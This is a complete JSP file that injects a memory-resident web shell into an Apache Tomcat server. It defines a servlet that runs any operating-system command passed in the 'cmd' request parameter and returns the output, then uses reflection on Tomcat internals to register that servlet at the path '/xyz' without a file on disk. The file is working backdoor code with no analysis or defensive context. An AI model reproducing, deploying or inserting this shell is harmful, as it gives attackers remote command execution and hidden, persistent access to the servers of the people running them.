<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import = "org.apache.catalina.core.ApplicationContext"%>
<%@ page import = "org.apache.catalina.core.StandardContext"%>
<%@ page import = "javax.servlet.*"%>
<%@ page import = "java.io.IOException"%>
<%@ page import = "java.lang.reflect.Field"%>
<%@ page import="javax.servlet.Servlet" %>
<%@ page import="javax.servlet.ServletConfig" %>
<%@ page import="javax.servlet.ServletException" %>
<%@ page import="javax.servlet.ServletRequest" %>
<%@ page import="javax.servlet.ServletResponse" %>
<%@ page import="javax.servlet.ServletContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>


<%
    class ServletDemo implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {}
        @Override
        public String getServletInfo() {return null;}
        @Override
        public void destroy() {}    public ServletConfig getServletConfig() {return null;}

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("cmd");
            if (cmd != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
                return;
            }
        }
    }
%>


<%
    ServletContext servletContext = (ServletContext) request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    ServletDemo demo = new ServletDemo();
    Wrapper demoWrapper = standardContext.createWrapper();

    demoWrapper.setName("xyz");
    demoWrapper.setLoadOnStartup(1);
    demoWrapper.setServlet(demo);
    demoWrapper.setServletClass(demo.getClass().getName());
    standardContext.addChild(demoWrapper);

    standardContext.addServletMappingDecoded("/xyz", "xyz");
//    out.println("inject servlet success!");
%>
